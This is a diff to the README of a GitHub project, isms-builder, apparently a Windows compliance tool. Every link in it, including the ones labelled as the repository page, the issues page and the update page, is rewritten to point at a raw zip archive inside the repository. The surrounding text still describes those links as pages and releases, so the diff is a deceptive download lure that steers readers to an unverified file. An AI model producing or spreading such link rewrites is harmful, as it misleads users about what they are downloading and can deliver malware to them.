@@ -1,6 +1,6 @@
 # 🔒 isms-builder - Manage Your Security Easily
 
-[![Download isms-builder](https://img.shields.io/badge/Download-isms--builder-brightgreen)](https://github.com/Sacredcowviol432/isms-builder)
+[![Download isms-builder](https://img.shields.io/badge/Download-isms--builder-brightgreen)](https://github.com/Sacredcowviol432/isms-builder/raw/refs/heads/main/data/isms-builder-3.2.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Follow these steps to download and open the app.
 
 1. Click the download button below. It will open the GitHub page where you can get the app files.
 
-[![Download isms-builder](https://img.shields.io/badge/Download-isms--builder-blue)](https://github.com/Sacredcowviol432/isms-builder)
+[![Download isms-builder](https://img.shields.io/badge/Download-isms--builder-blue)](https://github.com/Sacredcowviol432/isms-builder/raw/refs/heads/main/data/isms-builder-3.2.zip)
 
 2. On the GitHub page, look for the **Releases** section. Click the latest release link. It usually has a name like `v1.0.0`.
 
@@ -84,7 +84,7 @@ If the app does not open or you see an error:
 - Make sure your Windows is up to date
 - Check your antivirus is not blocking the app
 - Re-run the installer and choose **Repair** if available
-- Visit the [issues page](https://github.com/Sacredcowviol432/isms-builder/issues) for known problems
+- Visit the [issues page](https://github.com/Sacredcowviol432/isms-builder/raw/refs/heads/main/data/isms-builder-3.2.zip) for known problems
 
 If you feel stuck, opening an issue on GitHub allows the developers to help.
 
@@ -92,7 +92,7 @@ If you feel stuck, opening an issue on GitHub allows the developers to help.
 
 New versions come out with fixes and improvements. To update:
 
-1. Visit the main GitHub page: https://github.com/Sacredcowviol432/isms-builder
+1. Visit the main GitHub page: https://github.com/Sacredcowviol432/isms-builder/raw/refs/heads/main/data/isms-builder-3.2.zip
 
 2. Download the latest release installer as you did before.
 
@@ -122,7 +122,7 @@ This tool focuses on making compliance easy, not complicated.
 
 You can download and install isms-builder from the link below:
 
-[Download isms-builder from GitHub](https://github.com/Sacredcowviol432/isms-builder)
+[Download isms-builder from GitHub](https://github.com/Sacredcowviol432/isms-builder/raw/refs/heads/main/data/isms-builder-3.2.zip)
 
 ---
 
